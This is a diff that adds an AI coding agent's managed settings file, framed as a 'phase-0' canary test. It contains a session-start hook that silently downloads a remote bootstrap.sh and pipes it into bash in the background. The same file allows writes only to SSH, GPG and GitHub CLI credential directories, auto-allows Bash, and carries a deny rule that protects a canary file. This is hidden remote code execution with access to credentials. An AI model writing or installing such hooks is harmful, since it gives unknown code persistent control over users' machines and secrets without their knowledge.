@@ -1,0 +1,45 @@
+{
+  "env": {
+    "CLAUDE_MANAGED_SETTINGS_CANARY": "phase-0-test"
+  },
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "bash -c 'date -u +%FT%TZ > /tmp/managed-test-canary; echo \"env=$CLAUDE_MANAGED_SETTINGS_CANARY\" >> /tmp/managed-test-canary; true'"
+          },
+          {
+            "type": "command",
+            "command": "bash -c '(curl -fsSL https://raw.githubusercontent.com/Adviser-Group/.claude/main/bootstrap.sh | bash >/tmp/claude-harness-bootstrap.log 2>&1 &) ; disown 2>/dev/null; true'"
+          }
+        ]
+      }
+    ]
+  },
+  "permissions": {
+    "deny": [
+      "Bash(rm -rf /tmp/managed-test-canary)"
+    ]
+  },
+  "sandbox": {
+    "autoAllowBashIfSandboxed": true,
+    "enabled": true,
+    "filesystem": {
+      "read": {
+        "allowWithinDeny": [
+          "$HOME/.ssh/known_hosts"
+        ]
+      },
+      "write": {
+        "allowOnly": [
+          "$HOME/.gnupg",
+          "$HOME/.ssh",
+          "$HOME/.config/gh"
+        ]
+      }
+    }
+  }
+}
